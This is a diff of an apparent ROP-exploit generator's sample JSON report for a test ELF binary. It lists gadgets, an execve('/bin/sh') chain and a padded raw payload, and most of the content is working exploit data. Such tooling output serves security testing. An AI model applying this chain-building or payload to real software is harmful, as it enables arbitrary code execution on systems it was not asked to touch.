@@ -1,50 +1,215 @@
-// sample json output
 {
-  "target_binary": "sample_x86.elf",
-  "architecture": "x86",
-  "protections": {
-    "NX": true,
-    "PIE": false,
-    "RELRO": "Partial",
-    "Canary": false
-  },
-  "gadgets": [
-    {
-      "address": "0x08048456",
-      "gadget": "pop eax; ret",
-      "category": "register_move"
+    "architecture": "x86_64",
+    "file_type": "ELF",
+    "gadgets": [
+        {
+            "address": "0x0000000000401070",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000000004010a0",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000000004010e0",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000000401106",
+            "category": "x86_64",
+            "gadget": "mov byte ptr [rip + 0x2f13], 1 ; pop rbp ; ret",
+            "instructions": "mov byte ptr [rip + 0x2f13], 1 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000000040110d",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x000000000040110e",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000000401110",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000000401126",
+            "category": "x86_64",
+            "gadget": "push rbp ; mov rbp, rsp ; pop rdi ; ret",
+            "instructions": "push rbp ; mov rbp, rsp ; pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000000401127",
+            "category": "x86_64",
+            "gadget": "mov rbp, rsp ; pop rdi ; ret",
+            "instructions": "mov rbp, rsp ; pop rdi ; ret"
+        },
+        {
+            "address": "0x000000000040112a",
+            "category": "x86_64",
+            "gadget": "pop rdi ; ret",
+            "instructions": "pop rdi ; ret"
+        },
+        {
+            "address": "0x000000000040112b",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000000040112c",
+            "category": "x86_64",
+            "gadget": "pop rsi ; ret",
+            "instructions": "pop rsi ; ret"
+        },
+        {
+            "address": "0x000000000040112d",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000000040112e",
+            "category": "x86_64",
+            "gadget": "pop rdx ; ret",
+            "instructions": "pop rdx ; ret"
+        },
+        {
+            "address": "0x000000000040112f",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000000401130",
+            "category": "x86_64",
+            "gadget": "pop rax ; ret",
+            "instructions": "pop rax ; ret"
+        },
+        {
+            "address": "0x0000000000401131",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000000401132",
+            "category": "x86_64",
+            "gadget": "syscall",
+            "instructions": "syscall"
+        },
+        {
+            "address": "0x0000000000401135",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x0000000000401136",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000000401159",
+            "category": "x86_64",
+            "gadget": "mov eax, 0 ; pop rbp ; ret",
+            "instructions": "mov eax, 0 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000000040115e",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x000000000040115f",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        }
+    ],
+    "protections": {
+        "Canary": false,
+        "NX": false,
+        "PIE": false,
+        "RELRO": "None"
     },
-    {
-      "address": "0x0804851c",
-      "gadget": "pop ebx; pop ecx; pop edx; ret",
-      "category": "syscall_prep"
+    "raw_payload": {
+        "data": "\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x2a\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x0d\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x2c\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2e\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x30\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x3b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x32\\x11\\x40\\x00\\x00\\x00\\x00\\x00",
+        "format": "python_hex_string",
+        "padding_size": 104
     },
-    {
-      "address": "0x0804847a",
-      "gadget": "int 0x80",
-      "category": "syscall_trigger"
-    }
-  ],
-  "rop_chain": [
-    {
-      "step": 1,
-      "address": "0x08048456",
-      "description": "Set EAX to syscall number (execve)"
+    "report_date": "2026-10-10T20:09:43Z",
+    "report_id": "ROPW-binsh_test_65e22acd2b3f",
+    "rop_chain_details": [
+        {
+            "assembly": "pop rdi ; ret",
+            "comment": "Set RDI to /bin/sh address",
+            "gadget_address": "0x000000000040112a",
+            "index": 1,
+            "register": "rdi",
+            "type": "Register_Load",
+            "value_loaded": "0x000000000000200d"
+        },
+        {
+            "assembly": "pop rsi ; ret",
+            "comment": "Set RSI to 0",
+            "gadget_address": "0x000000000040112c",
+            "index": 2,
+            "register": "rsi",
+            "type": "Register_Load",
+            "value_loaded": "0x0000000000000000"
+        },
+        {
+            "assembly": "pop rdx ; ret",
+            "comment": "Set RDX to 0",
+            "gadget_address": "0x000000000040112e",
+            "index": 3,
+            "register": "rdx",
+            "type": "Register_Load",
+            "value_loaded": "0x0000000000000000"
+        },
+        {
+            "assembly": "pop rax ; ret",
+            "comment": "Set RAX to syscall number 59 (execve)",
+            "gadget_address": "0x0000000000401130",
+            "index": 4,
+            "register": "rax",
+            "type": "Register_Load",
+            "value_loaded": "0x000000000000003b"
+        },
+        {
+            "assembly": "syscall",
+            "comment": "Invoke execve syscall",
+            "gadget_address": "0x0000000000401132",
+            "index": 5,
+            "register": "",
+            "type": "Syscall_Execution",
+            "value_loaded": "N/A"
+        }
+    ],
+    "rop_chain_generation": {
+        "chain_notes": "Attempted ROP chain generation.",
+        "status": "Success (Execve-Shell)",
+        "target_syscall": "execve"
     },
-    {
-      "step": 2,
-      "address": "0x0804851c",
-      "description": "Set EBX, ECX, EDX to /bin/sh, NULL, NULL"
+    "target_binary": {
+        "filename": "test_binaries\\binsh_test",
+        "hash": "65e22acd2b3fa65863ac11d09bad8657099e6979a1d912ed7b6231e489def2a8",
+        "sha256": "65e22acd2b3fa65863ac11d09bad8657099e6979a1d912ed7b6231e489def2a8"
     },
-    {
-      "step": 3,
-      "address": "0x0804847a",
-      "description": "Trigger syscall"
-    }
-  ],
-  "summary": {
-    "chain_type": "execve syscall",
-    "success": true,
-    "notes": "Basic execve chain created for x86 32-bit ELF without stack canary or PIE."
-  }
+    "tool_version": "ROPWeaver_v1.2.3"
 }
